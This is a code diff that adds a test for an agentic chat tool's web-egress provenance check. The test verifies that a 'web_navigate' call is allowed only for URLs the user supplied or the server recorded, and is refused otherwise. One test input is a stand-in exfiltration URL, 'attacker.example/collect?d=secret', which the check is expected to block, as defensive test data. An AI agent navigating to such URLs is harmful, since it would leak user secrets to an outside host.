@@ -262,4 +262,44 @@ describe('agentic chat web egress provenance', () => {
 			})
 		).toMatchObject({ allowed: false, reason: 'url_not_explicitly_requested' });
 	});
+
+	it('starts web_navigate only from a user or server-recorded URL, with a goal', () => {
+		const navigate = (
+			url: string,
+			userMessage: string,
+			knownResearchUrl?: boolean,
+			goal = 'open bids'
+		) =>
+			evaluateAgenticChatWebEgressProvenance({
+				toolName: 'web_navigate',
+				arguments: { url, goal, max_pages: 5 },
+				userMessage,
+				knownResearchUrl
+			});
+		expect(
+			navigate('https://www.aacounty.org/', 'Find open bids on https://www.aacounty.org/')
+		).toEqual({
+			allowed: true
+		});
+		expect(
+			navigate('https://business.naaccc.com/event-calendar', 'When is the lunch?', true)
+		).toEqual({
+			allowed: true
+		});
+		expect(
+			navigate('https://attacker.example/collect?d=secret', 'Find the lunch details.')
+		).toMatchObject({
+			allowed: false,
+			reason: 'url_not_explicitly_requested'
+		});
+		expect(
+			navigate('https://www.aacounty.org/', 'https://www.aacounty.org/', undefined, ' ')
+		).toMatchObject({
+			allowed: false,
+			reason: 'invalid_web_egress_arguments'
+		});
+		expect(
+			navigate('https://www.aacounty.org/', "Don't browse https://www.aacounty.org/ yet.")
+		).toMatchObject({ allowed: false, reason: 'url_not_explicitly_requested' });
+	});
 });
